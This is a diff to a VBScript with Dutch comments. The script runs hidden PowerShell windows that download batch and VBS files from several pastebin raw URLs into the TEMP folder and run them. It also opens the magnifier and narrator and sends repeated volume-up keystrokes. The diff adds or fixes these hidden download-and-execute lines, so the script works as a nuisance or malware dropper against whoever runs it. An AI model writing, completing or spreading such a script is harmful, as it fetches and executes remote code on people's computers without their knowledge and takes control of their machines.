@@ -4,9 +4,11 @@ Set WshShell = CreateObject("WScript.Shell")
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/wCbsqrNY','$env:TEMP\pingyoutube.bat'); Start-Process $env:TEMP\pingyoutube.bat""", 0, False
 WScript.Sleep 1750
 
-WshShell.Run "powershell -w hidden -c ""Invoke-WebRequest -Uri 'https://pastebin.com/raw/TiNThhxW' -OutFile $env:TEMP\relaunchping.bat; Start-Process cmd -WindowStyle hidden -ArgumentList '/c', $env:TEMP\relaunchping.bat""", 0, False
+' Download en start relaunchping.bat
+WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/TiNThhxW','$env:TEMP\relaunchping.bat'); Start-Process cmd -WindowStyle hidden -ArgumentList '/c', $env:TEMP\relaunchping.bat""", 0, False
 WScript.Sleep 1200
 
+' Download en start mousemove.vbs
 WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/NfhDWkdS','$env:TEMP\mousemove.vbs'); Start-Process $env:TEMP\mousemove.vbs""", 0, False
 WScript.Sleep 500
 
@@ -17,11 +19,13 @@ WshShell.Run "magnify.exe", 1, False
 For i = 1 To 60
     WshShell.SendKeys Chr(175)
     WScript.Sleep 150
+Next
 
 ' Start verteller
 WshShell.Run "narrator", 0, False
 
-WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/tLYqCwJQ','%TEMP%\soundloop.vbs')""", 0, True
+' Download en start soundloop.vbs
+WshShell.Run "powershell -w hidden -c ""(New-Object Net.WebClient).DownloadFile('https://pastebin.com/raw/tLYqCwJQ','$env:TEMP\soundloop.vbs')""", 0, True
 WshShell.Run "wscript.exe %TEMP%\soundloop.vbs", 0, False
 
 Do
